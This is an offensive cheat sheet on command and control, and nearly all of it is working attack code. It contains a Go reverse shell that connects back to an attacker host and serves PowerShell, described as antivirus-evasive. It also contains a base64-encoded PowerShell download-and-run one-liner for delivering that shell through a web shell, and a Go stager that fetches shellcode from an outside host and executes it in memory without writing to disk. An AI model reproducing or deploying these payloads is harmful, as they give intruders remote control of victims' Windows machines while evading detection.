# C2 - Command and Control

## Go Reverse Shell (AV-evasive, no CGO)

```go
package main
import ("net"; "os/exec")
func main() {
    c, _ := net.Dial("tcp", "<LHOST>:<LPORT>")
    cmd := exec.Command("powershell")
    cmd.Stdin = c; cmd.Stdout = c; cmd.Stderr = c
    cmd.Run()
}
```
```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -o shell.exe shell.go
```
Deliver via web shell with a base64-encoded PowerShell download-and-run:
```bash
printf '%s' 'IWR http://<LHOST>/shell.exe -OutFile $env:TEMP\s.exe; Start-Process $env:TEMP\s.exe' \
| iconv -f UTF-8 -t UTF-16LE | base64 -w0
# pass as: powershell.exe -e <base64>
```

## Go In-Memory Shellcode Stager (Windows, no CGO)

Fetches raw shellcode from a URL, allocates RWX memory via `VirtualAlloc`, copies it in, and transfers execution — payload never touches disk:
```go
package main
import ("io"; "net/http"; "syscall"; "unsafe")
var (
    kernel32         = syscall.NewLazyDLL("kernel32.dll")
    procVirtualAlloc = kernel32.NewProc("VirtualAlloc")
)
const (MEM_COMMIT = 0x1000; MEM_RESERVE = 0x2000; PAGE_EXECUTE_READWRITE = 0x40)
func main() {
    resp, _ := http.Get("http://<LHOST>/shellc.bin")
    sc, _ := io.ReadAll(resp.Body)
    addr, _, _ := procVirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    for i, b := range sc { *(*byte)(unsafe.Pointer(addr + uintptr(i))) = b }
    syscall.Syscall(addr, 0, 0, 0, 0)
}
```
```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -o stager.exe stager.go
```
